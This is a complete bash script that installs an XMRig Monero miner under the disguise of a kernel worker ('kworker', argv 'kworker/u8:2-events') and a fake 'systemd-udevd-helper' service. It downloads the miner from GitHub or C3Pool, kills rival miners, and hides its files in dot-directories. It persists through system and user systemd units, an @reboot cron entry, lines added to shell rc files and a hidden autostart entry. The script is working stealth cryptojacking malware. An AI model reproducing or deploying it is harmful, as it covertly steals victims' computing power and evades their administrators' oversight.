#!/usr/bin/env bash

VERSION="5.1-unified-multi-pool-stealth-universal-fixed"

C3POOL_DOWNLOAD_URL="https://download.c3pool.org/xmrig_setup/raw/master/xmrig.tar.gz"
XMRIG_LATEST_API="https://api.github.com/repos/xmrig/xmrig/releases/latest"

DISGUISE_BIN="kworker"
DISGUISE_ARGV="kworker/u8:2-events"
SERVICE_NAME="systemd-udevd-helper.service"
DIR_SUFFIX=".kwork"
CONFIG_NAME="resolv.conf.bak"
WRAPPER_NAME=".udev-helper"

WALLET="${1:-}"
EMAIL="${2:-}"
PASS="${EMAIL:-x}"

log() { printf '%s\n' "$*"; }
fail() { printf 'ERROR: %s\n' "$*" >&2; exit 1; }

HAS_BASH=0
[ -n "$BASH_VERSION" ] && HAS_BASH=1

HAS_PIDOF=0
command -v pidof >/dev/null 2>&1 && HAS_PIDOF=1

HAS_PGREP=0
command -v pgrep >/dev/null 2>&1 && HAS_PGREP=1

HAS_ROOT=0
if [ "$(id -u 2>/dev/null || echo 1)" = "0" ]; then
  HAS_ROOT=1
elif command -v sudo >/dev/null 2>&1 && sudo -n true 2>/dev/null; then
  HAS_ROOT=1
fi

find_pid() {
  local target="$1"
  local p=""
  if [ "$HAS_PIDOF" = "1" ]; then
    p="$(pidof "$target" 2>/dev/null | awk '{print $1}')"
    [ -n "$p" ] && { echo "$p"; return 0; }
  fi
  if [ "$HAS_PGREP" = "1" ]; then
    p="$(pgrep -x "$target" 2>/dev/null | head -n 1)"
    [ -n "$p" ] && { echo "$p"; return 0; }
  fi
  if [ "$HAS_PGREP" = "1" ]; then
    p="$(pgrep -f "$DISGUISE_ARGV" 2>/dev/null | head -n 1)"
    [ -n "$p" ] && { echo "$p"; return 0; }
  fi
  if [ -d /proc ]; then
    local proc
    for proc in /proc/[0-9]*; do
      [ -r "$proc/comm" ] || continue
      if [ "$(cat "$proc/comm" 2>/dev/null)" = "$target" ]; then
        echo "${proc#/proc/}"
        return 0
      fi
    done
  fi
  if [ -d /proc ]; then
    local proc
    for proc in /proc/[0-9]*; do
      [ -r "$proc/cmdline" ] || continue
      if tr '\0' ' ' < "$proc/cmdline" 2>/dev/null | grep -qF "$DISGUISE_ARGV"; then
        echo "${proc#/proc/}"
        return 0
      fi
    done
  fi
  return 1
}

is_running() {
  [ -n "$(find_pid "$1")" ]
}

INSTALL_DIR=""
CANDIDATES=(
    "${XDG_DATA_HOME:-$HOME/.local/share}/${DIR_SUFFIX}"
    "$HOME/.cache/${DIR_SUFFIX}"
    "$HOME/.config/${DIR_SUFFIX}"
    "$HOME/${DIR_SUFFIX}"
    "$HOME/.local/${DIR_SUFFIX}"
    "/tmp/${DIR_SUFFIX}-$(id -u 2>/dev/null || echo 0)"
    "/var/tmp/${DIR_SUFFIX}-$(id -u 2>/dev/null || echo 0)"
    "/dev/shm/${DIR_SUFFIX}-$(id -u 2>/dev/null || echo 0)"
    "/run/user/$(id -u 2>/dev/null || echo 0)/${DIR_SUFFIX}"
    "./${DIR_SUFFIX}"
)

for candidate in "${CANDIDATES[@]}"; do
    [ -n "$candidate" ] || continue
    if mkdir -p "$candidate" 2>/dev/null && [ -w "$candidate" ] && touch "$candidate/.wtest" 2>/dev/null; then
        rm -f "$candidate/.wtest" 2>/dev/null
        INSTALL_DIR="$candidate"
        break
    fi
done

if [ -z "$INSTALL_DIR" ]; then
    for last in "/dev/shm" "/tmp" "/var/tmp"; do
        if [ -w "$last" ]; then
            INSTALL_DIR="$last/${DIR_SUFFIX}-fallback-$$"
            mkdir -p "$INSTALL_DIR" 2>/dev/null && break
        fi
    done
fi

[ -n "$INSTALL_DIR" ] && [ -w "$INSTALL_DIR" ] || fail "No writable directory found"

ARCHIVE="$INSTALL_DIR/.pkg.tar.gz"
trap 'rm -f "$ARCHIVE" 2>/dev/null' EXIT
mkdir -p "$INSTALL_DIR/logs" 2>/dev/null || true

if [ -z "$WALLET" ]; then
  echo "Setup script v$VERSION"
  echo "Usage: $0 <wallet address or USDT TRC20 address> [email]"
  exit 1
fi

WALLET_BASE="${WALLET%%.*}"
case "${#WALLET_BASE}" in
  106|95|34) ;;
  *) fail "Wrong wallet base address length: ${#WALLET_BASE}" ;;
esac

CPU_THREADS="$(nproc 2>/dev/null || getconf _NPROCESSORS_ONLN 2>/dev/null || echo 1)"
case "$CPU_THREADS" in ''|*[!0-9]*) CPU_THREADS=1 ;; esac

EXP_MONERO_HASHRATE=$(( CPU_THREADS * 700 / 1000 ))
[ "$EXP_MONERO_HASHRATE" -gt 0 ] || EXP_MONERO_HASHRATE=1

get_port_based_on_hashrate() {
  local hashrate="$1"
  if [ "$hashrate" -le 5000 ]; then echo 80
  elif [ "$hashrate" -le 25000 ]; then echo 13333
  elif [ "$hashrate" -le 50000 ]; then echo 15555
  elif [ "$hashrate" -le 100000 ]; then echo 19999
  else echo 23333; fi
}

PORT="$(get_port_based_on_hashrate "$EXP_MONERO_HASHRATE")"

log "Setup script v$VERSION"
log "CPU threads: $CPU_THREADS"
log "Computed C3Pool port: $PORT"
log "Directory: $INSTALL_DIR"
log "Root access: $([ "$HAS_ROOT" = "1" ] && echo yes || echo no)"

download_file() {
  local url="$1" output="$2"
  if command -v curl >/dev/null 2>&1; then
    curl -fL --retry 3 --connect-timeout 15 "$url" -o "$output"
  elif command -v wget >/dev/null 2>&1; then
    wget -O "$output" "$url"
  elif command -v busybox >/dev/null 2>&1 && busybox wget --help >/dev/null 2>&1; then
    busybox wget "$url" -O "$output"
  elif command -v python3 >/dev/null 2>&1; then
    python3 - "$url" "$output" <<'PY'
import sys, urllib.request
urllib.request.urlretrieve(sys.argv[1], sys.argv[2])
PY
  else
    return 1
  fi
}

download_text() {
  local url="$1"
  if command -v curl >/dev/null 2>&1; then
    curl -fsSL --retry 3 --connect-timeout 15 -H 'Accept: application/vnd.github+json' -H 'User-Agent: unified-installer' "$url"
  elif command -v wget >/dev/null 2>&1; then
    wget -qO- --header='Accept: application/vnd.github+json' --user-agent='unified-installer' "$url"
  elif command -v python3 >/dev/null 2>&1; then
    python3 - "$url" <<'PY'
import sys, urllib.request
req = urllib.request.Request(sys.argv[1], headers={"Accept": "application/vnd.github+json", "User-Agent": "unified-installer"})
with urllib.request.urlopen(req, timeout=20) as r:
    sys.stdout.write(r.read().decode("utf-8"))
PY
  else
    return 1
  fi
}

get_latest_xmrig_url() {
  local arch json url
  arch="$(uname -m 2>/dev/null || echo unknown)"
  case "$arch" in x86_64|amd64) ;; *) return 2 ;; esac
  json="$(download_text "$XMRIG_LATEST_API")" || return 1
  url="$(printf '%s' "$json" | grep -oE 'https://[^"]+/xmrig-[0-9]+(\.[0-9]+)+-linux-static-x64\.tar\.gz"' | sed 's/"$//' | head -n 1)"
  [ -n "$url" ] || return 1
  printf '%s\n' "$url"
}

extract_archive() {
  local archive="$1" dest="$2" strip="${3:-0}"
  if [ "$strip" = "1" ]; then
    if tar xf "$archive" -C "$dest" --strip-components=1 2>/dev/null; then
      return 0
    fi
    local tmp="$dest/.extract.$$"
    mkdir -p "$tmp" || return 1
    tar xf "$archive" -C "$tmp" || { rm -rf "$tmp"; return 1; }
    local found
    found="$(find "$tmp" -type f -name xmrig 2>/dev/null | head -n 1)"
    if [ -n "$found" ]; then
      cp "$found" "$dest/xmrig" 2>/dev/null || true
      chmod +x "$dest/xmrig" 2>/dev/null || true
    fi
    rm -rf "$tmp"
    [ -f "$dest/xmrig" ]
  else
    tar xf "$archive" -C "$dest" || return 1
  fi
}

install_latest_official_xmrig() {
  local url version
  url="$(get_latest_xmrig_url)" || return $?
  version="$(basename "$url" | sed -E 's/^xmrig-([0-9.]+)-linux-static-x64\.tar\.gz$/\1/')"
  log "[*] Latest official XMRig detected: v$version"

  rm -rf "$INSTALL_DIR"/* 2>/dev/null || true
  mkdir -p "$INSTALL_DIR"
  rm -f "$ARCHIVE"

  download_file "$url" "$ARCHIVE" || return 1
  extract_archive "$ARCHIVE" "$INSTALL_DIR" 1 || return 1
  rm -f "$ARCHIVE"

  [ -f "$INSTALL_DIR/xmrig" ] || return 1
  mv "$INSTALL_DIR/xmrig" "$INSTALL_DIR/$DISGUISE_BIN"
  chmod +x "$INSTALL_DIR/$DISGUISE_BIN" 2>/dev/null || true
  return 0
}

install_c3pool_package() {
  log "[*] Falling back to C3Pool miner package"
  rm -rf "$INSTALL_DIR"/* 2>/dev/null || true
  mkdir -p "$INSTALL_DIR"
  rm -f "$ARCHIVE"

  download_file "$C3POOL_DOWNLOAD_URL" "$ARCHIVE" || return 1
  extract_archive "$ARCHIVE" "$INSTALL_DIR" 0 || return 1
  rm -f "$ARCHIVE"

  if [ ! -f "$INSTALL_DIR/xmrig" ]; then
    local found
    found="$(find "$INSTALL_DIR" -type f -name xmrig 2>/dev/null | head -n 1)"
    [ -n "$found" ] && cp "$found" "$INSTALL_DIR/xmrig" 2>/dev/null || true
  fi

  [ -f "$INSTALL_DIR/xmrig" ] && mv "$INSTALL_DIR/xmrig" "$INSTALL_DIR/$DISGUISE_BIN"
  chmod +x "$INSTALL_DIR/$DISGUISE_BIN" 2>/dev/null || true
  [ -f "$INSTALL_DIR/$DISGUISE_BIN" ]
}

if [ "$HAS_ROOT" = "1" ] && command -v systemctl >/dev/null 2>&1; then
  for svc in "$SERVICE_NAME" systemd-udevd.service nodebox.service c3pool_miner.service; do
    if [ "$(id -u 2>/dev/null)" = "0" ]; then
      systemctl stop "$svc" 2>/dev/null || true
    else
      sudo systemctl stop "$svc" 2>/dev/null || true
    fi
  done
fi

kill_old() {
  local names="nodebox xmrig $DISGUISE_BIN"
  local n pids proc
  for n in $names; do
    pids=""
    if [ "$HAS_PIDOF" = "1" ]; then
      pids="$(pidof "$n" 2>/dev/null)"
      [ -n "$pids" ] && kill -9 $pids 2>/dev/null || true
    fi
    if [ "$HAS_PGREP" = "1" ]; then
      pids="$(pgrep -x "$n" 2>/dev/null)"
      [ -n "$pids" ] && kill -9 $pids 2>/dev/null || true
    fi
    if [ -d /proc ]; then
      for proc in /proc/[0-9]*; do
        [ -r "$proc/comm" ] || continue
        if [ "$(cat "$proc/comm" 2>/dev/null)" = "$n" ]; then
          kill -9 "${proc#/proc/}" 2>/dev/null || true
        fi
      done
    fi
  done
  if [ "$HAS_PGREP" = "1" ]; then
    pids="$(pgrep -f "$DISGUISE_ARGV" 2>/dev/null)"
    [ -n "$pids" ] && kill -9 $pids 2>/dev/null || true
  fi
}
kill_old

log "[*] Preparing package"
if ! install_latest_official_xmrig; then
  log "WARNING: Could not download latest official release. Attempting fallback."
  install_c3pool_package || fail "Unable to download either release or fallback."
fi

if ! "$INSTALL_DIR/$DISGUISE_BIN" --help >/dev/null 2>&1; then
  log "WARNING: Bundled core is not functional on this host."
  if [ -f /etc/os-release ] && grep -q 'NAME="Alpine Linux"' /etc/os-release; then
    if command -v apk >/dev/null 2>&1 && apk add --no-cache xmrig >/dev/null 2>&1 && command -v xmrig >/dev/null 2>&1; then
      cp "$(command -v xmrig)" "$INSTALL_DIR/$DISGUISE_BIN"
      chmod +x "$INSTALL_DIR/$DISGUISE_BIN"
    else
      fail "Alpine backup fallback failed"
    fi
  elif command -v apt-get >/dev/null 2>&1 && [ "$HAS_ROOT" = "1" ]; then
    if [ "$(id -u 2>/dev/null)" = "0" ]; then
      apt-get install -y -qq xmrig >/dev/null 2>&1 || true
    else
      sudo apt-get install -y -qq xmrig >/dev/null 2>&1 || true
    fi
    if command -v xmrig >/dev/null 2>&1; then
      cp "$(command -v xmrig)" "$INSTALL_DIR/$DISGUISE_BIN"
      chmod +x "$INSTALL_DIR/$DISGUISE_BIN"
    fi
  fi
  if ! "$INSTALL_DIR/$DISGUISE_BIN" --help >/dev/null 2>&1; then
    fail "Binary is not functional"
  fi
fi

CONFIG_PATH="$INSTALL_DIR/$CONFIG_NAME"
CONFIG_BG="$INSTALL_DIR/.${CONFIG_NAME}.bg"

cat > "$CONFIG_PATH" <<EOF_CONFIG
{
    "autosave": true,
    "background": false,
    "cpu": true,
    "opencl": false,
    "cuda": false,
    "pools": [
        { "url": "auto.c3pool.org:$PORT", "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": false },
        { "url": "auto.c3pool.org:19999", "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": false },
        { "url": "auto.c3pool.org:443",   "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": true  },
        { "url": "auto.c3pool.org:80",    "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": false },
        { "url": "auto.c3pool.org:33333", "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": true  },
        { "url": "auto.c3pool.org:23333", "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": false },
        { "url": "pool.supportxmr.com:443",  "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": true  },
        { "url": "pool.supportxmr.com:8080", "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": false },
        { "url": "pool.supportxmr.com:7777", "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": false },
        { "url": "pool.supportxmr.com:5555", "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": false },
        { "url": "pool.supportxmr.com:80",   "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": false },
        { "url": "pool.supportxmr.com:3333", "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": false }
    ],
    "log-file": null,
    "donate-level": 0,
    "max-cpu-usage": 100,
    "syslog": false
}
EOF_CONFIG

cp "$CONFIG_PATH" "$CONFIG_BG"
sed -i 's/"background": false/"background": true/' "$CONFIG_BG"

RUNNER="$INSTALL_DIR/$WRAPPER_NAME"
RUNNER_BG="$INSTALL_DIR/.${WRAPPER_NAME}-bg"

if command -v bash >/dev/null 2>&1; then
  RUNNER_SHEBANG="#!/usr/bin/env bash"
else
  RUNNER_SHEBANG="#!/bin/sh"
fi

cat > "$RUNNER" <<EOF_MINER
$RUNNER_SHEBANG
cd "$INSTALL_DIR" 2>/dev/null || true
export XMRIG_NO_TLS_WARN=1
export XMRIG_QUIET=1

BIN="$INSTALL_DIR/$DISGUISE_BIN"
CFG="$CONFIG_PATH"
ARGV0="$DISGUISE_ARGV"
BINNAME="$DISGUISE_BIN"

_is_running() {
  local n="\$1"
  command -v pidof >/dev/null 2>&1 && pidof "\$n" >/dev/null 2>&1 && return 0
  command -v pgrep >/dev/null 2>&1 && pgrep -x "\$n" >/dev/null 2>&1 && return 0
  command -v pgrep >/dev/null 2>&1 && pgrep -f "\$ARGV0" >/dev/null 2>&1 && return 0
  if [ -d /proc ]; then
    for p in /proc/[0-9]*; do
      [ -r "\$p/comm" ] || continue
      [ "\$(cat "\$p/comm" 2>/dev/null)" = "\$n" ] && return 0
    done
  fi
  return 1
}

_exec_m() {
  if [ -n "\$BASH_VERSION" ] && command -v nice >/dev/null 2>&1; then
    exec -a "\$ARGV0" nice -n 19 "\$BIN" "\$@" >/dev/null 2>&1
  elif [ -n "\$BASH_VERSION" ]; then
    exec -a "\$ARGV0" "\$BIN" "\$@" >/dev/null 2>&1
  elif command -v nice >/dev/null 2>&1; then
    exec nice -n 19 "\$BIN" "\$@" >/dev/null 2>&1
  else
    exec "\$BIN" "\$@" >/dev/null 2>&1
  fi
}

if ! _is_running "\$BINNAME"; then
  if [ "\$#" -eq 0 ]; then
    _exec_m --config="\$CFG" --no-color --quiet
  else
    _exec_m "\$@"
  fi
fi
EOF_MINER
chmod +x "$RUNNER"

cat > "$RUNNER_BG" <<EOF_MINER
$RUNNER_SHEBANG
cd "$INSTALL_DIR" 2>/dev/null || true

BINNAME="$DISGUISE_BIN"
ARGV0="$DISGUISE_ARGV"
RUNNER="$RUNNER"

_is_running() {
  local n="\$1"
  command -v pidof >/dev/null 2>&1 && pidof "\$n" >/dev/null 2>&1 && return 0
  command -v pgrep >/dev/null 2>&1 && pgrep -x "\$n" >/dev/null 2>&1 && return 0
  command -v pgrep >/dev/null 2>&1 && pgrep -f "\$ARGV0" >/dev/null 2>&1 && return 0
  if [ -d /proc ]; then
    for p in /proc/[0-9]*; do
      [ -r "\$p/comm" ] || continue
      [ "\$(cat "\$p/comm" 2>/dev/null)" = "\$n" ] && return 0
    done
  fi
  return 1
}

if command -v bash >/dev/null 2>&1; then
  _shell="bash"
else
  _shell="sh"
fi

if ! _is_running "\$BINNAME"; then
  if command -v setsid >/dev/null 2>&1; then
    setsid "\$_shell" "\$RUNNER" --config="$CONFIG_BG" </dev/null >/dev/null 2>&1 &
  elif command -v nohup >/dev/null 2>&1; then
    nohup "\$_shell" "\$RUNNER" --config="$CONFIG_BG" </dev/null >/dev/null 2>&1 &
  else
    "\$_shell" "\$RUNNER" --config="$CONFIG_BG" </dev/null >/dev/null 2>&1 &
  fi
  disown 2>/dev/null || true
fi
EOF_MINER
chmod +x "$RUNNER_BG"

start_without_systemd() {
  if command -v bash >/dev/null 2>&1; then
    bash "$RUNNER_BG" >/dev/null 2>&1 &
  else
    sh "$RUNNER_BG" >/dev/null 2>&1 &
  fi
  disown 2>/dev/null || true
}

if command -v systemctl >/dev/null 2>&1 && [ "$HAS_ROOT" = "1" ]; then
  log "[*] Installing system service"

  MEM_KB=0
  if [ -r /proc/meminfo ]; then
    MEM_KB="$(awk '/MemTotal/{print $2}' /proc/meminfo 2>/dev/null || echo 0)"
    case "$MEM_KB" in ''|*[!0-9]*) MEM_KB=0 ;; esac
  fi
  if [ "$MEM_KB" -gt 3500000 ]; then
    if [ "$(id -u 2>/dev/null)" = "0" ]; then
      echo "vm.nr_hugepages=$((1168 + CPU_THREADS))" | tee -a /etc/sysctl.conf >/dev/null 2>&1 || true
      sysctl -w vm.nr_hugepages=$((1168 + CPU_THREADS)) >/dev/null 2>&1 || true
    else
      echo "vm.nr_hugepages=$((1168 + CPU_THREADS))" | sudo tee -a /etc/sysctl.conf >/dev/null 2>&1 || true
      sudo sysctl -w vm.nr_hugepages=$((1168 + CPU_THREADS)) >/dev/null 2>&1 || true
    fi
  fi

  cat > "$INSTALL_DIR/.svc" <<EOF_SERVICE
[Unit]
Description=System Udev Events Helper
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
ExecStart=$RUNNER --config=$CONFIG_PATH
StandardOutput=null
StandardError=null
Restart=always
RestartSec=30
Nice=19
CPUWeight=1
IOSchedulingClass=idle
IOSchedulingPriority=7
OOMScoreAdjust=500

[Install]
WantedBy=multi-user.target
EOF_SERVICE

  _sd_ok=0
  if [ "$(id -u 2>/dev/null)" = "0" ]; then
    if cp "$INSTALL_DIR/.svc" "/etc/systemd/system/$SERVICE_NAME" 2>/dev/null && \
       systemctl daemon-reload 2>/dev/null && \
       systemctl enable "$SERVICE_NAME" >/dev/null 2>&1 && \
       systemctl restart "$SERVICE_NAME" 2>/dev/null; then
      _sd_ok=1
    fi
  else
    if sudo cp "$INSTALL_DIR/.svc" "/etc/systemd/system/$SERVICE_NAME" 2>/dev/null && \
       sudo systemctl daemon-reload 2>/dev/null && \
       sudo systemctl enable "$SERVICE_NAME" >/dev/null 2>&1 && \
       sudo systemctl restart "$SERVICE_NAME" 2>/dev/null; then
      _sd_ok=1
    fi
  fi

  if [ "$_sd_ok" = "1" ]; then
    log "[*] Service installed: $SERVICE_NAME"
  else
    log "WARNING: systemd install failed, falling back"
    HAS_ROOT=0
  fi
fi

if [ "$HAS_ROOT" = "0" ]; then
  log "[*] No root - user-level persistence"

  if [ -z "$XDG_RUNTIME_DIR" ] && [ -d "/run/user/$(id -u 2>/dev/null)" ]; then
    export XDG_RUNTIME_DIR="/run/user/$(id -u 2>/dev/null)"
  fi

  if command -v systemctl >/dev/null 2>&1 && \
     systemctl --user show-environment >/dev/null 2>&1; then
    USER_DIR="$HOME/.config/systemd/user"
    if mkdir -p "$USER_DIR" 2>/dev/null; then
      cat > "$USER_DIR/$SERVICE_NAME" <<EOF_USERVICE
[Unit]
Description=System Udev Events Helper
After=network.target

[Service]
Type=simple
ExecStart=$RUNNER --config=$CONFIG_PATH
Restart=always
RestartSec=30
Nice=19
OOMScoreAdjust=500

[Install]
WantedBy=default.target
EOF_USERVICE
      systemctl --user daemon-reload 2>/dev/null || true
      systemctl --user enable --now "$SERVICE_NAME" 2>/dev/null || true
      command -v loginctl >/dev/null 2>&1 && \
        loginctl enable-linger "$(id -un 2>/dev/null)" 2>/dev/null || true
    fi
  fi

  if command -v crontab >/dev/null 2>&1; then
    CRON_LINE="@reboot $RUNNER_BG >/dev/null 2>&1"
    (crontab -l 2>/dev/null | grep -F -q "$RUNNER_BG") || {
      (crontab -l 2>/dev/null; echo "$CRON_LINE") | crontab - 2>/dev/null || true
    }
  fi

  for RC in "$HOME/.profile" "$HOME/.bashrc" "$HOME/.zshrc" "$HOME/.bash_profile" "$HOME/.config/fish/config.fish"; do
    [ -n "$HOME" ] && [ -d "$HOME" ] || continue
    touch "$RC" 2>/dev/null || continue
    [ -w "$RC" ] || continue
    START_LINE="$RUNNER_BG >/dev/null 2>&1"
    grep -F -q "$START_LINE" "$RC" 2>/dev/null || \
      printf '\n%s\n' "$START_LINE" >> "$RC" 2>/dev/null || true
  done

  if [ -d "$HOME/.config" ] || mkdir -p "$HOME/.config" 2>/dev/null; then
    AUTOSTART_DIR="$HOME/.config/autostart"
    mkdir -p "$AUTOSTART_DIR" 2>/dev/null && \
    cat > "$AUTOSTART_DIR/udev-helper.desktop" <<EOF_DESKTOP
[Desktop Entry]
Type=Application
Name=System Events
Exec=bash $RUNNER_BG
Hidden=false
NoDisplay=true
X-GNOME-Autostart-enabled=true
EOF_DESKTOP
  fi

  start_without_systemd
fi

verify_running() {
  local max_attempts=15
  local attempt=1
  local pid=""
  local pcomm pcmd pnice conn

  log "[*] Verifying process is running..."

  while [ "$attempt" -le "$max_attempts" ]; do
    pid="$(find_pid "$DISGUISE_BIN")"
    if [ -n "$pid" ]; then
      pcomm=""
      pcmd=""
      pnice=""
      [ -r "/proc/$pid/comm" ] && pcomm="$(cat "/proc/$pid/comm" 2>/dev/null)"
      [ -r "/proc/$pid/cmdline" ] && pcmd="$(tr '\0' ' ' < "/proc/$pid/cmdline" 2>/dev/null | sed 's/ $//')"
      [ -r "/proc/$pid/stat" ] && pnice="$(awk '{print $19}' "/proc/$pid/stat" 2>/dev/null)"

      log ""
      log "=========================================="
      log "[+] MINER IS RUNNING"
      log "=========================================="
      log "  PID         : $pid"
      log "  comm        : ${pcomm:-unknown}"
      log "  cmdline     : ${pcmd:-unknown}"
      log "  nice        : ${pnice:-unknown}"
      log "  config      : $CONFIG_PATH"

      if command -v systemctl >/dev/null 2>&1; then
        if systemctl is-active "$SERVICE_NAME" >/dev/null 2>&1; then
          log "  service     : $SERVICE_NAME (system, active)"
        elif systemctl --user is-active "$SERVICE_NAME" >/dev/null 2>&1; then
          log "  service     : $SERVICE_NAME (user, active)"
        fi
      fi

      conn=""
      if command -v ss >/dev/null 2>&1; then
        conn="$(ss -tunp 2>/dev/null | grep -E "pid=$pid[,)]" | head -n 3)"
      elif command -v netstat >/dev/null 2>&1; then
        conn="$(netstat -tunp 2>/dev/null | grep -E "[[:space:]]$pid/" | head -n 3)"
      fi
      if [ -n "$conn" ]; then
        log "  connections :"
        printf '%s\n' "$conn" | while IFS= read -r line; do
          log "    $line"
        done
      fi

      log ""
      log "[+] Setup complete - miner verified running (PID $pid)"
      log "=========================================="
      return 0
    fi

    if [ "$attempt" -lt "$max_attempts" ]; then
      sleep 1
    fi
    attempt=$((attempt + 1))
  done

  log ""
  log "=========================================="
  log "[-] VERIFY FAILED - miner not detected"
  log "=========================================="
  log "  Binary      : $INSTALL_DIR/$DISGUISE_BIN"
  log "  Config      : $CONFIG_PATH"
  log "  Wrapper     : $RUNNER"
  log ""
  log "  Debug steps:"
  log "    1. Check binary:   $INSTALL_DIR/$DISGUISE_BIN --version"
  log "    2. Check config:   cat $CONFIG_PATH"
  log "    3. Run manually:   bash $RUNNER --config=$CONFIG_PATH"
  log "    4. Check logs:     $INSTALL_DIR/logs/"
  if command -v systemctl >/dev/null 2>&1; then
    log "    5. Check service:  systemctl status $SERVICE_NAME"
  fi
  log "=========================================="
  return 1
}

if verify_running; then
  exit 0
else
  exit 2
fi